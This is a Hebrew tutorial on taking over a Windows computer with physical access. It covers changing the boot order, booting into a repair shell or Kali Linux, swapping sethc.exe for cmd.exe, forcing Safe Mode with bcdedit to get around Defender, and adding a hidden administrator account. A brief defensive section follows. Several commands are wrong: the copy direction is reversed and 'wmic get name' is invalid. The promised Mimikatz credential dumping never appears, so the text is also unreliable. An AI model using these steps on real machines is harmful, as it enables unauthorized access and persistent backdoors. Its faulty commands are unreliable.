מדריך למתקפה על Windows עם שינוי סדר אתחול ושימוש ב-Mimikatz

במדריך הזה, אציג את הדרך בה אפשר להשתמש במערכת הפעלה חיצונית (כגון Kali Linux) כדי לבצע התקפה על מחשב Windows, לשנות את סדר האתחול, להפעיל את ה-Command Prompt ולבצע מתקפות כמו שינוי הרשאות, שליפת סיסמאות ונתונים, והגנה מפני תוקפים.

התחלת המתקפה - שינוי סדר אתחול:

1. תחילה עלינו לשנות את סדר האתחול במחשב כדי לאתחל את המחשב בעזרת מערכת הפעלה חדשה.

2. נכנס למצב "תיקון המחשב" דרך מסך אתחול (Boot) כדי להיכנס ל-“Troubleshoot” ואז לבחור ב-“Advanced Options”.

3. בחר ב-“Command Prompt” ונמצא את עצמנו ב-“Rescue Shell”.

בדיקת דיסקים במערכת:

נשתמש בפקודת wmic get name או wmic opticaldisk get name כדי לראות את הדיסקים שמחוברים למחשב:

wmic get name

שינוי קבצים ב-System32:

כעת, נעבור לנתיב \windows\system32 כדי לשנות את הקובץ sethc.exe (שמשמש עבור Sticky Keys) או קובץ אחר כמו osk.exe כדי להחליפם ב-cmd.exe או ftp.exe.

פקודה לדוגמה:

copy sethc.exe cmd.exe

אם המערכת משבשת את הפעולה, נוכל לשנות את הקובץ דרך ftp.exe:

!cmd

שימוש במצב Safe Mode:

אם ה-Defender חוסם את הפעולה, אפשר להפעיל את המחשב במצב "Safe Mode" (ללא הגנות):

bcdedit /set {default} safeboot minimal

לאחר מכן השתמש בפקודת shutdown כדי לאתחל את המחשב מחדש:

shutdown /f /r /t 0

הגדרת משתמשים והרשאות:

1. יצירת משתמש חדש: כדי להוסיף משתמש חדש עם סיסמא:

net user new_username Pa$$w0rd /add

2. שינוי הרשאות: להפוך את המשתמש החדש לאדמיניסטרטור:

net localgroup administrators new_username /add

3. הסתרת משתמשים: נוכל להסתיר משתמשים דרך "Registry Editor" ולהגביל את הצגת המשתמשים במסך ההתחברות.

שימוש ב-Kali Linux (במערכת חי):

1. הפעלת Kali Linux: אם נשנה את סדר האתחול, נוכל להפעיל את Kali Linux ולהיכנס לדיסק של Windows.

2. התקנת את הדיסק של Windows: השתמש בפקודות:

fdisk -l
mount /dev/sda2 /mnt

3. העתקת הקבצים ב-System32: ננווט לנתיב \windows\system32 ונבצע את ההעתקה מחדש:

cp sethc.exe cmd.exe

4. הסנכרון והפסקת חיבור: סנכרן את השינויים והפסק את החיבור:

sync
umount /mnt

הגנה מפני התקפות Sticky Keys:

כדי להגן על המחשב, ניתן לנקוט בכמה פעולות:

  • סיסמת BIOS: אם נשמור סיסמה ב-BIOS, אף אחד לא יוכל לשנות את סדר האתחול.
  • הצפנה עם BitLocker: הצפנת הכונן תמנע גישה למידע אם המחשב יאבד.
  • גישה מוגבלת: הגבלת גישה פיזית למחשב על ידי נעילת חדרים או שימוש באבטחה נוספת.

סיכום:

במדריך הזה, למדנו כיצד:

  • לשנות את סדר האתחול במחשב כדי להפעיל מערכת הפעלה חיצונית.
  • לעקוף את הגבלות ה-Defender של Windows.
  • ליצור משתמשים ולהעלות את הרשאותיהם.
  • לשלוף סיסמאות והאשינגים מהזיכרון של Windows.
  • לעבוד עם Kali Linux כדי לגשת למערכת.
  • להגן על עצמך מפני התקפות Sticky Keys.
